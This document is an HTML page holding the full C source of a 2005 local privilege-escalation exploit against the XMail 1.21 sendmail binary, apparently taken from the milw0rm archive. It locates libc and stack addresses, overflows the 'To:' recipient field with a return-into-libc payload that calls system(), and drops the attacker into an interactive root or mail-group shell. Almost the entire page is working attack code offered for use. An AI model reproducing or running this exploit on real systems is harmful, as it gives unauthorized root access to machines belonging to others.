<html>
<head>
<title>XMail 1.21 (-t Command Line Option) Local Root                   Buffer Overflow Exploit</title>
<pre>
/*
* XMail 1.21 'sendmail' local exploit (ret-into-libc)
* Yields uid root || gid mail
* By qaaz [at] centrum [dot] cz, 2005
*/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/select.h&gt;


#define TARGET &quot;/var/MailRoot/bin/sendmail&quot;

#define NM &quot;nm&quot;
#define GREP &quot;grep&quot;
#define MKDIR &quot;mkdir&quot;
#define TMP &quot;/tmp&quot;
#define MAILROOT TMP&quot;/mr&quot;

#define ID &quot;/usr/bin/id&quot;
#define SH &quot;/bin/sh&quot;

#define OVERLEN (256+12 + 16)
/* EmitRecipients() stack */
/* | locals + padding + PUSHes | RET | Arg1... | */
/* |&lt;--------- OVERLEN -------&gt;| */

#define MAX(x,y) (((x)&gt;(y)) ? (x) : (y))

char *libc_file = NULL;
unsigned int libc_base = 0;
unsigned int stack_base = 0;

unsigned int file_addr = 0;
unsigned int system_addr = 0;

int pid;
int pi[2], po[2], pe[2];

void sigchild(int sig)
{
if (waitpid(pid, NULL, WNOHANG) == pid) {
printf(&quot;[*] Vuln terminated\n&quot;);
exit(-1);
}
}

void killchild()
{
if (pid) kill(pid, SIGKILL);
}

char bad_chars(char *buf, int len)
{
int i;
if (len == 0) len == strlen(buf);
for (i = 0; i &lt; len; i++) {
if (!buf[i] || strchr(&quot;&lt;&gt; \t,\&quot;:;'\r\n&quot;, buf[i]))
return buf[i];
}
return 0;
}

unsigned int get_sym(char *lib, char *sym)
{
FILE *f;
char buf[1024];
unsigned int val = 0;

sprintf(buf, &quot;%s -D %s | %s -w %s&quot;, NM, lib, GREP, sym);
if (f = popen(buf, &quot;r&quot;)) {
fgets(buf, sizeof(buf), f);
sscanf(buf, &quot;%08lx %*s %*s&quot;, &amp;val);
pclose(f);
}
return val;
}

unsigned int check_sym(char *lib, char *sym, unsigned int base)
{
unsigned int offs = get_sym(lib, sym);
unsigned int addr = base + offs;

if (!offs) {
printf(&quot;[-] %s: not found?\n&quot;, sym);
return 0;
}
if (bad_chars((char *) &amp;addr, 4)) {
printf(&quot;[-] %s: 0x%08x, bad chars\n&quot;, sym, addr);
return 0;
}
printf(&quot;[+] %s: 0x%08x\n&quot;, sym, addr);
return addr;
}

void do_maps(int pid)
{
FILE *f;
char buf[1024];

sprintf(buf, &quot;/proc/%d/maps&quot;, pid);
if (!(f = fopen(buf, &quot;r&quot;))) return;

while (fgets(buf, sizeof(buf), f)) {
unsigned int addr_beg, addr_end;
char pathname[1024];
int offset;

pathname[0] = 0;
sscanf(buf, &quot;%08lx-%08lx %*s %08lx %*s %*s %s&quot;,
&amp;addr_beg, &amp;addr_end, &amp;offset, pathname);

if (offset &lt; 0)
stack_base = addr_end;
else if (strstr(pathname, &quot;/libc&quot;) &amp;&amp; (!libc_base || addr_beg &lt; libc_base))
libc_base = addr_beg, libc_file = (char *) strdup(pathname);
}
fclose(f);
}

void do_syms()
{
if (!(file_addr = check_sym(libc_file, &quot;stdout&quot;, libc_base))
&amp;&amp; !(file_addr = check_sym(libc_file, &quot;stderr&quot;, libc_base))
&amp;&amp; !(file_addr = check_sym(libc_file, &quot;stdin&quot;, libc_base))) {
printf(&quot;[-] Can't use std files\n&quot;);
exit(-1);
}

if (!(system_addr = check_sym(libc_file, &quot;system&quot;, libc_base))) {
printf(&quot;[-] Can't use system()\n&quot;);
exit(-1);
}
}

void do_shell()
{
fd_set fds;
struct timeval tv;
int retval, maxfd;
char buf[1024];

maxfd = MAX(0, MAX(po[0], pe[0])) + 1;

while (1) {
FD_ZERO(&amp;fds);
FD_SET(0, &amp;fds);
FD_SET(po[0], &amp;fds);
FD_SET(pe[0], &amp;fds);
tv.tv_sec = 0;
tv.tv_usec = 100;

if (select(maxfd, &amp;fds, NULL, NULL, &amp;tv) == -1) break;

if (FD_ISSET(0, &amp;fds)) {
if ((retval = read(0, buf, sizeof(buf))) &lt;= 0) break;
write(pi[1], buf, retval);
}
if (FD_ISSET(po[0], &amp;fds)) {
if ((retval = read(po[0], buf, sizeof(buf))) &lt;= 0) break;
write(1, buf, retval);
}
if (FD_ISSET(pe[0], &amp;fds)) {
if ((retval = read(pe[0], buf, sizeof(buf))) &lt;= 0) break;
write(2, buf, retval);
}
}
}

int main(int argc, char *argv[])
{
if (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;-sh&quot;)) {
setresuid(geteuid(), geteuid(), geteuid());
setresgid(getegid(), getegid(), getegid());
system(ID);
execl(SH, SH, &quot;-i&quot;, NULL);
perror(&quot;execl&quot;);
exit(-1);
}

if (pipe(pi) || pipe(po) || pipe(pe)) {
perror(&quot;[-] pipe&quot;);
return -1;
}

if ((pid = fork()) == -1) {
perror(&quot;[-] fork&quot;);
return -1;
}

if (pid) {
unsigned int i;
char buf[10*1024];

atexit(killchild);
signal(SIGCHLD, sigchild);
sleep(1);

printf(&quot;[*] Reading maps...\n&quot;);
do_maps(pid);
printf(&quot;[%c] libc: 0x%08x\n&quot;, libc_base?'+':'-', libc_base);
if (!libc_base) exit(-1);
printf(&quot;[%c] stack: 0x%08x\n&quot;, stack_base?'+':'-', stack_base);
if (!stack_base) exit(-1);

printf(&quot;[*] Getting symbols...\n&quot;);
do_syms();

strcpy(buf, &quot;To: h4h4@&quot;);
for (i = 0; i &lt; OVERLEN-5; i++) // &quot;h4h4@&quot; == 5
strcat(buf, &quot;A&quot;);
strncat(buf, (char *) &amp;system_addr, 4);
strncat(buf, (char *) &amp;file_addr, 4);
i = stack_base - 5000;
strncat(buf, (char *) &amp;i, 4);
strcat(buf, &quot;\n&quot;);

write(pi[1], buf, strlen(buf));
sleep(1); do_shell();
printf(&quot;[*] Done\n&quot;);
exit(1);
}
else {
char buf[10*1024];
char *_env[3] = { NULL, &quot;MAIL_ROOT=&quot;MAILROOT, NULL };
char *_arg[3] = { TARGET, &quot;-t&quot;, NULL };

sprintf(buf, &quot;%s -p %s/spool/temp&quot;, MKDIR, MAILROOT);
system(buf);

sprintf(buf, &quot;%10000s -sh&quot;, argv[0]);
_env[0] = (char *) strdup(buf);

printf(&quot;[*] Executing vuln...\n&quot;);

close(0); dup2(pi[0], 0);
close(1); dup2(po[1], 1);
close(2); dup2(pe[1], 2);
execve(_arg[0], _arg, _env);
perror(&quot;[-] execve&quot;);
return -1;
}

exit(1);
}

// milw0rm.com [2005-10-20]
</pre>
</html>

